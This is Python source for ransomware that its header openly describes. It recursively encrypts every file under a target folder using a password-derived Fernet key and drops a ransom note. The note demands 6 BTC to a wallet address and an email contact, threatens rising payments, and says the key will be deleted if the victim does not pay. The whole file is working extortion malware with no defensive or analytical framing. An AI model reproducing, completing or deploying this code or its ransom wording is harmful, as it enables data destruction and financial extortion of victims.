                                                       #Copyright (C) 2024 privateboss01
#This symmetric key ransomware encrypts the files and child folder of a directory with a password and drops a payment_instruction text files which can be found by searching for "payment_instructions"
#Once the payment has been recieved, the attacker sends the password to the victim to release the encrypted files and folders.
import pathlib
import secrets
import os
import base64
import getpass

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

payment = open("payment_instructions", "w")

payment.write('''You have to send 6BTC to this address: 15kRaTOsdAnTENeRoAtReUSodinVirgil12
 
Then send an email to recovermyfiles@proton.me. With Email Subject +++ victim 1010 Paid +++... And we will send the password and Decryption key.
 
If after 72hrs we do not hear from you, 3BTC would be added for the next 7days after which we would delete the key and your files are lost forever.
 
WARNING: Do not attempt to 1) Decrypt it yourself as it is a waste of your time 2) Change the original file name as it makes the files unrecoverable 3) Sending paid without actually paying as it would incure an additional 2.5BTC''')

payment.close()
def generate_salt(size=48):
    return secrets.token_bytes(size)
def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())
def load_salt():
    return open("salt.salt", "rb").read()
def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    if load_existing_salt:
        salt = load_salt()
    elif save_salt:
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    derived_key = derive_key(salt, password)

    return base64.urlsafe_b64encode(derived_key)
def encrypt(filename, key, exempt_list=[]):
    if any(pattern in filename for pattern in exempt_list):
        print(f"Skipping encryption for: {payment_instructions}")
        return
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)        
def encrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            encrypt(child, key)
        elif child.is_dir():
            encrypt_folder(child, key)
def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid Password, You need the correct password to decrypt your files and folders")
        return
    with open(filename, "wb") as file:
        file.write(decrypted_data)   
def decrypt_folder(foldername, key):
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            decrypt(child, key)
        elif child.is_dir():
            decrypt_folder(child, key)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="File Encryptor Script with a Password")
    parser.add_argument("path", help="Path to encrypt/decrypt, can be a file or an entire folder")
    parser.add_argument("-s", "--salt-size", help="If this is set, a new salt with the passed size is generated",
                        type=int)
    parser.add_argument("-e", "--encrypt", action="store_true",
                        help="Whether to encrypt the file/folder, only -e or -d can be specified.")
    parser.add_argument("-d", "--decrypt", action="store_true",
                        help="Whether to decrypt the file/folder, only -e or -d can be specified.")
    args = parser.parse_args()
    if args.encrypt:
        password = getpass.getpass("Enter the password for encryption: ") #Refer to the password generator app for a secure password!
    elif args.decrypt:
        password = getpass.getpass("Enter the correct password you recieved for decryption: ")
    if args.salt_size:
        key = generate_key(password, salt_size=args.salt_size, save_salt=True)
    else:
        key = generate_key(password, load_existing_salt=True)
    encrypt_ = args.encrypt
    decrypt_ = args.decrypt
    if encrypt_ and decrypt_:
        raise TypeError("Do you want to encrypt the file or decrypt it. Only -e or -d can be specified")
    elif encrypt_:
        if os.path.isfile(args.path):
            encrypt(args.path, key)
        elif os.path.isdir(args.path):
            encrypt_folder(args.path, key)
    elif decrypt_:
        if os.path.isfile(args.path):
            decrypt(args.path, key)
        elif os.path.isdir(args.path):
            decrypt_folder(args.path, key)
    else:
        raise TypeError("Do you want to encrypt the file or decrypt it. Only -e or -d can be specified")
